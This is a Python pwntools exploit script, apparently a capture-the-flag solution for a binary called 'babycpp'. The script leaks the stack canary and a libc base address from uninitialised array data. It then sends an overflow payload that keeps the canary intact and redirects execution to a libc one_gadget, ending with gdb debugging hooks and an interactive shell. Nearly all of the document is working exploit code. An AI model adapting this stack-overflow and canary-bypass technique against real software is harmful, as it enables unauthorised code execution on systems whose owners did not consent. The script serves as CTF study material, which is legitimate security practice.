from pwn import *
context.log_level="debug"
def uns(num):
	if num>=0:
		return num;
	return 0x100000000+num
def apple(num1,num2):
	num1,num2=uns(num1),uns(num2)
	num=(num1<<32)+num2
	return num
def do_unique():
	p.readuntil(">")
	p.sendline("3")
	data=p.readuntil("\n")
	log.info("#"+data[1:-2]+"#")
	data=data[1:-2].split(" ")
	print data
	return map(int,data[:len(data)])
def leak_l(data):
	return apple(uns(data[17]),uns(data[16]))
def leak_c(data):
	return apple(uns(data[19]),uns(data[18]))
def cnum(size):
	p.readuntil("> ")
	p.sendline("1")
	p.sendline(str(size))
def input_arry(size):
	p.readuntil("> ")
	p.sendline("2")
	arry="1 "*size
	p.readuntil("num:")
	p.sendline(arry)
p=process("./babycpp")
libc=ELF("./libc.so.6")
p.readuntil(" n:")
size=30
one_gadget=0x45216
p.sendline(str(size))
data=do_unique()
canary=leak_c(data)
log.success("Canary=========>%s",hex(canary))
cnum(10)
input_arry(10)
cnum(60)
data=do_unique()
base=leak_l(data)-0x20830
log.success("Libc=========>%s",hex(base))
libc.address=base
cnum(28)
p.readuntil("> ")
p.sendline("2")
one_gadget=base+one_gadget
log.success("one_gadget=========>%s",hex(one_gadget))
p1=one_gadget&0xffffffff
p2=one_gadget-p1
p2=p2>>32
log.info(hex(p1))
log.info(hex(p2))
p3=canary&0xffffffff
p4=canary-p3
p4=p4>>32
payload="1 "*8+"1 "*14+str(p3)+" "+str(p4)+" "+"1 "*2+str(p1)+" "+str(p2)+" "
p.sendline(payload)
if 1:
	gdb.attach(p,'''
	b *0x40100a
	c
	''')
p.readuntil("> ")
p.sendline("4")
p.interactive()


'''
split = arr.split(" ")
	return map(int,split[:len(split)-1])

0x7fffffffdcf8 0xc8
b *0x400fe2
'''
